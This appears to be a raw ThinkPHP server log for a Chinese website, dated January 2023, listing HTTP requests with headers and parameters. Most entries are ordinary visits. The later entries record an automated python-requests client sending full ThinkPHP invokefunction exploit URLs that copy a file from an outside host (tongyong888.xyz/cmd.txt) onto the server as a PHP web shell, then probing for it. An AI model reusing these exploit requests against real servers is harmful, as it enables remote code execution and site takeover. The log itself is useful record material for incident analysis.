[ log ] www.lingdayun.com/ [运行时间：0.083605s][吞吐率：11.96req/s] [内存消耗：1,277.73kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'none',
  'x-requested-with' => 'com.tencent.mm',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/wxpic,image/tpg,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:20:00+08:00 ] 10.0.8.4 27.115.124.70 GET /
[ log ] www.lingdayun.com/ [运行时间：0.075951s][吞吐率：13.17req/s] [内存消耗：1,276.87kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://baidu.com/',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:20:31+08:00 ] 10.0.8.4 42.236.10.93 GET /
[ log ] www.lingdayun.com/ [运行时间：0.075742s][吞吐率：13.20req/s] [内存消耗：1,276.87kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://baidu.com/',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:56:45+08:00 ] 10.0.8.4 59.83.208.104 GET /
[ log ] www.lingdayun.com/ [运行时间：0.072306s][吞吐率：13.83req/s] [内存消耗：1,277.08kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://www.lingdayun.com/',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T23:07:40+08:00 ] 10.0.8.4 43.248.96.184 GET /?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php
[ log ] www.lingdayun.com/?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php [运行时间：0.058533s][吞吐率：17.08req/s] [内存消耗：1,112.81kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Home',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'copy',
    1 => 
    array (
      0 => 'http://tongyong888.xyz/cmd.txt',
      1 => 'roeter.php',
    ),
  ),
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T23:07:40+08:00 ] 10.0.8.4 43.248.96.184 GET /roeter.php
[ log ] www.lingdayun.com/roeter.php [运行时间：0.056756s][吞吐率：17.62req/s] [内存消耗：1,112.33kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'roeter.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/roeter_php' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T23:07:41+08:00 ] 10.0.8.4 43.248.96.184 GET /?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php
[ log ] www.lingdayun.com/?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php [运行时间：0.067945s][吞吐率：14.72req/s] [内存消耗：1,113.52kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'copy',
    1 => 
    array (
      0 => 'http://tongyong888.xyz/cmd.txt',
      1 => 'roeter.php',
    ),
  ),
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T23:07:41+08:00 ] 10.0.8.4 43.248.96.184 GET /roeter.php
[ log ] www.lingdayun.com/roeter.php [运行时间：0.065422s][吞吐率：15.29req/s] [内存消耗：1,112.33kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'roeter.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/roeter_php' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T23:07:55+08:00 ] 10.0.8.4 43.248.96.184 GET /?s=/admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=system.php
[ log ] www.lingdayun.com/?s=/admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=system.php [运行时间：0.068001s][吞吐率：14.71req/s] [内存消耗：1,113.52kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'copy',
    1 => 
    array (
      0 => 'http://tongyong888.xyz/cmd.txt',
      1 => 'system.php',
    ),
  ),
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T23:07:55+08:00 ] 10.0.8.4 43.248.96.184 GET /system.php
[ log ] www.lingdayun.com/system.php [运行时间：0.063176s][吞吐率：15.83req/s] [内存消耗：1,112.33kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'system.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/system_php' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
